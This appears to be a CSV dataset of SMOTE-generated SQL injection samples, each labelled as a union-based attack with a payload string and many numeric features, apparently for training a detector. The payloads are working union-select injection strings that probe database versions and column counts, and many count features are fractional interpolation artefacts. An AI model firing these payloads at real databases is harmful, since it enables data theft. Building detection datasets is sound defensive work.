id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000264,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000041,0.5954196252734184,50.09848130459402,21.279797507279202,3.8220693835282953,14.0,13.11919002911681,14.559595014558406,8.419696260918803,0.28195147544169435,0.25943761433283025,0.2908339359902405,0.1677769742352349,0.8601012463603988,0.13989875363960122,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.139898753639601,1.0,0.0,1.2797975072792025,3.0,0.8601012463603988,0.13989875363960125,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000265,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.4680772953343598,70.23231589204885,25.218585271363906,4.142871216303897,27.0,24.185852713639072,11.0,8.046463178409768,0.3974380615715185,0.32896229739671884,0.1619192102698779,0.11168043076188477,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,4.046463178409768,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000266,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.037357161665957136,101.99050189954038,26.0,4.081669544963691,62.0,5.0,24.009498100459624,10.981003799080751,0.6079002991873904,0.049024217676402415,0.23541028544534193,0.10766519769086513,2.971505698621127,0.0,2.0,0.0,1.9905018995403756,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.009498100459624,0.9905018995403756,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000267,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000013,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000268,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000013,2.6620490386552222,97.47690440459006,26.523095595409945,3.7168332467725063,45.661669167869626,3.9538088091801065,34.90761761836021,12.953808809180106,0.4686317687206439,0.0405100716680728,0.3580161017914442,0.13284205781983902,1.4307132137701601,0.5230955954099465,2.0,0.0,1.0,1.4769044045900535,0.0,4.0,0.0,0.0,1.0,4.476904404590053,0.4769044045900533,0.5230955954099467,1.0,0.5230955954099467,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000269,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000055,0.07204144151261968,105.56891455905853,26.0,3.779137594611336,25.0,44.45513164724683,22.0,14.113782911811706,0.23691736116136947,0.4209322221418088,0.20848727782200516,0.13366313887481654,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,7.113782911811706,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000270,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000128,1.0198319449274325,120.63514286606765,28.254057146427062,4.138771480104193,33.508114292854124,52.0,16.12702857321353,19.0,0.2768705391695486,0.43178939624100743,0.13357086211676808,0.15776920247267578,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,9.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.5635142866067652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.5635142866067655
SMOTE_000271,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000138,0.45992648723370533,113.57700114983915,28.476933486645223,4.16272858291564,37.0,42.86160091987132,17.0,16.71540022996783,0.3267382514513419,0.37612334946852943,0.1501229803965625,0.14701541868356616,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.71540022996783,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000272,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000095,0.5157876840118549,92.03602290432454,27.0,3.874141195410893,25.0,35.28582651066347,20.928739765995203,10.821456627665867,0.27225063155497137,0.3834364095676343,0.2266738059610881,0.11763915291630628,0.17854337233413275,0.0,3.0,0.0,0.0,1.0,0.0,1.821456627665867,0.0,0.0,4.821456627665867,4.0,0.17854337233413303,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,1.2960202049361187,100.915491285537,26.0,4.0508077621798275,63.830982571073996,4.542254357231499,24.0,8.5422543572315,0.63238605856903,0.045063527381908386,0.23784590285756,0.08470451119150166,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.542254357231499,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5422543572315,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000274,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000097,0.677361593212797,88.07628973830684,28.92288692149205,4.2118318621997,31.46103179064547,28.0,15.615257947661368,13.0,0.35603409285374205,0.31874475384859546,0.17723251758224318,0.14798863571541934,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.3076289738306841,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.307628973830684
SMOTE_000275,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000120,0.0955191158312813,40.65795937918921,19.06579593791892,3.893178985960987,14.0,16.526367503351366,4.0,6.131591875837841,0.34539428434567554,0.4052636750335137,0.09868408124162158,0.1506579593791892,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,2.1315918758378407,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,union,"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",nearest_attack_euclidean,R000122,0.06271027053278087,118.61276570751028,32.11617028774692,4.282989359100027,37.0,47.69021256600821,17.0,16.922553141502053,0.3120289622097078,0.40195224280275116,0.14336465831256845,0.14265413667497262,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.922553141502053,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000277,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,0.5707003744116602,82.96665015798224,24.044997523697337,4.030901876451621,27.0,33.573320126385795,11.0,11.393330031596449,0.3294819689877302,0.39974042285934996,0.13423339477277896,0.13654421338014086,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,6.393330031596449,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000278,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000085,0.0674441885108647,59.52621868215131,18.968414578810087,3.6046765150102287,14.0,31.620974945721052,4.0,9.905243736430263,0.23578997720365985,0.5305257403386745,0.06736856491533139,0.1663157175423343,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.905243736430262,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000279,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000026,1.291606532664408,75.0,31.645766312536885,4.404552690335856,41.41693474985246,2.6457663125368853,17.0,13.93729893761066,0.5522257966646994,0.03527688416715846,0.22666666666666666,0.18583065250147546,1.9372989376106582,0.0,2.0,0.0,2.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.6457663125368861,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000280,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000088,0.02660630769084907,41.03832795877201,18.0,3.7306271163914984,14.0,16.03832795877201,4.0,7.0,0.3411725791746298,0.3907632514738755,0.09747787976417993,0.1705862895873149,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.9904180103069979,0.0,2.009581989693002,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,0.5185895127144242,81.48014781362649,26.189981523296687,4.058674760947408,25.0,29.72022172043974,17.13988913978013,9.620036953406622,0.3073086433187691,0.3629580197205543,0.21187605358774733,0.11785728337292928,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.1899815232966888,0.0,0.0,3.430055430109934,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000282,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000132,0.2757642127927651,61.416462311540144,24.71670753769197,4.150391027415747,27.0,17.133169849232115,11.0,6.283292462308029,0.44019372245856825,0.27828892153058576,0.17933818322386114,0.10217917278698485,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,2.2832924623080286,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,0.3049059866534134,84.5431887184669,26.0,4.035803173757614,25.0,33.23455097477351,16.0,10.308637743693378,0.2959228206514688,0.39281019878357903,0.18939060521694,0.12187637534801225,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.308637743693378,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000284,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.11851084777185787,76.0,33.4383356696176,4.451528251299977,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000285,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R000137,0.729724148235369,98.22983531885035,27.52456042555906,4.0089261797698725,25.0,42.85263744664564,17.426318723322822,12.95087914888188,0.2565922503065677,0.43535314350481824,0.1766218117033583,0.1314327944852558,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.2377197872204702,0.0,0.0,6.713159361661409,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.3720018422699412,42.89923299111743,18.420153401776513,3.8370371639025858,14.0,18.319386392893946,4.0,6.579846598223487,0.32745041006908665,0.42577095992104386,0.09355726001973903,0.15322136999013047,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,2.5798465982234866,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000020,1.9286802857047045,75.53238530611931,32.5323853061193,4.432255038258995,41.06477061223861,3.0,17.0,14.467614693880694,0.543607435732127,0.03971979720730562,0.22507885084139856,0.19159391621916888,3.0,0.0,2.0,0.0,1.4676146938806953,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.935229387761391,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.5323853061193048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.532385306119305
SMOTE_000288,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000046,0.13208572767103174,108.06274153737377,27.0,4.057590867977568,29.0,48.85019322989902,15.0,15.212548307474753,0.26845631637317763,0.4519325001506387,0.1388567153654367,0.140754468110747,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.212548307474753,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000289,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000113,0.590369356414832,103.36626776251651,27.683133881258257,4.053737303726911,29.0,44.0,15.0,15.366267762516516,0.28057864205194394,0.4257055258719149,0.14512688381997096,0.14858894825617022,2.366267762516517,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000290,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.3503928117629693,102.0,25.900304143329702,4.077261776670586,62.39878342668119,4.900304143329702,24.0,10.700912429989103,0.6117527786929529,0.04804219748362454,0.23529411764705882,0.10491090617636376,2.700912429989103,0.0,2.0,0.0,2.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.0,0.9003041433297011,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000291,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,0.704185542926649,87.06388075625836,26.580554393751196,4.054011774222348,25.0,32.0,19.483326362507167,10.580554393751195,0.28760414740208046,0.368133308674663,0.22277028058741113,0.12149226333584545,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.5805543937511946,0.0,0.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000292,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,0.22880246336400448,89.04600240313566,26.86371462901938,4.035926192674054,25.0,32.0,21.182287774116283,10.86371462901938,0.28097054081949246,0.35964229224895033,0.23740212139243386,0.12198504553912341,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.8637146290193805,0.0,0.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000293,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000025,1.7314017414406213,75.0,32.0,4.409488214762479,42.09354083571137,2.476614791072155,17.0,13.42984437321647,0.5612472111428183,0.03302153054762874,0.22666666666666666,0.1790645916428863,1.4298443732164698,0.0,2.0,0.0,2.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.4766147910721566,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000294,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,1.0990220526857157,102.68067529327702,25.680675293277016,4.05995615698698,66.0,4.0,24.0,8.680675293277016,0.6427827365927772,0.03895652949047135,0.23373917694282806,0.08452155697392344,0.0,0.0,2.0,0.0,1.319324706722983,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.680675293277018,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.680675293277017,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000295,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000125,0.1014557972769788,64.47887250606318,24.104225498787365,4.066912949754045,27.0,19.583098004850548,11.0,6.895774501212637,0.4189924211118703,0.30341638979333896,0.17070061600853975,0.10689057308625105,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,2.895774501212636,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
